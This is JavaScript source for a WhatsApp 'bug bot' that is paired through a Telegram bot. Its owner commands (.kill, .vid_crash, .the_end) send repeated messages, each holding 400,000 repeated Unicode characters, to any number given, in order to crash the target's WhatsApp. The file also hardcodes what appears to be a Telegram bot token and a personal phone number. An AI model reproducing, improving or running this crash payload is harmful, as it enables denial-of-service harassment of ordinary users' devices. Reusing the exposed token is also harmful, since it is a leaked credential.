const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');
const fs = require('fs');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
const AD_IMAGE_URL = "https://telegra.ph/file/a8a183d25667e41793741.jpg";

let botConfig = {
    botName: "NEXUS-MD V3 3M SUPREME",
    owner: "94767475809", // ඔයාගේ Number එක මෙතන තියෙන්න ඕනේ
    prefix: ".",
};

app.get('/', (req, res) => res.send('Nexus System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    // Session එක save වෙන තැන ස්ථාවර කළා
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "110.0.5481.178"], 
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    // --- 🤖 TELEGRAM PAIRING ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 3M SYSTEM*\n\nEnter your WhatsApp number with 94 code.", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *Connecting... Check your WhatsApp notification now!*");
                await delay(3000);
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *3M POWER KEY:* \`${code}\` \n\nEnter this code in WhatsApp Linked Devices section.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ *Error!* Please restart the bot."); }
        }
    });

    // --- 📩 AUTO MENU ON LINK SUCCESS ---
    sock.ev.on('connection.update', async (up) => {
        const { connection, lastDisconnect } = up;
        if (connection === 'close') {
            let reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) startNexus();
        } else if (connection === 'open') {
            console.log('✅ BOT LINKED SUCCESSFULLY!');
            
            const ownerJid = botConfig.owner + "@s.whatsapp.net";
            
            // ලින්ක් වුණ ගමන් මෙනු එක ඔයාගේ අංකයට එවනවා
            const welcomeMsg = `
╭─────〔 *NEXUS 3M SUPREME* 〕─────┈
│
│ ✅ *SYSTEM LINKED SUCCESSFULLY!*
│ 🦠 *P O W E R :* \`3,000,000+\` Characters
│ ⚡ *S T A T U S :* _Master Private_
│
├─────────────┈
│ ☠️ *.vid_crash* [num]
│ 🔥 *.ios_dead* [num]
│ 💀 *.kill* [num]
│ 🌌 *.the_end* [num]
╰─────────────┈
 👑 *DEV:* SASIYA MD
 📢 *CHANNEL:* ${CHANNEL_URL}`;

            await sock.sendMessage(ownerJid, { 
                text: welcomeMsg,
                contextInfo: { 
                    externalAdReply: { 
                        title: "NEXUS-MD 3M ACTIVE ⚡",
                        body: "3M Power is Ready for Deployment",
                        mediaType: 1,
                        thumbnailUrl: AD_IMAGE_URL, 
                        sourceUrl: CHANNEL_URL
                    }
                }
            });
        }
    });

    // --- 📩 COMMAND HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            
            const from = mek.key.remoteJid;
            // අයිතිකරු හඳුනාගැනීම වඩාත් ශක්තිමත් කළා
            const sender = mek.key.participant || from;
            const isOwner = sender.includes(botConfig.owner) || from.includes(botConfig.owner);
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            const bugPayload = "☠️ 3M SUPREME ☠️\n" + "ꦿ".repeat(200000) + "᥋".repeat(200000);

            if (command === 'menu' || command === 'bug') {
                // මෙතනත් මෙනු එක එන විදිය Fix කළා
                await sock.sendMessage(from, { text: welcomeMsg }, { quoted: mek });
            }

            if (['kill', 'vid_crash', 'the_end'].includes(command)) {
                if (!targetNum) return sock.sendMessage(from, { text: "❌ Please provide a target number!" });
                await sock.sendMessage(from, { text: `🌑 *DEPLOYING 3M BUG...*` });
                for(let i=0; i<8; i++) {
                    await sock.sendMessage(targetJid, { text: bugPayload });
                    await delay(500);
                }
                await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
            }

        } catch (e) { console.log(e); }
    });

    sock.ev.on('creds.update', saveCreds);
}

startNexus();
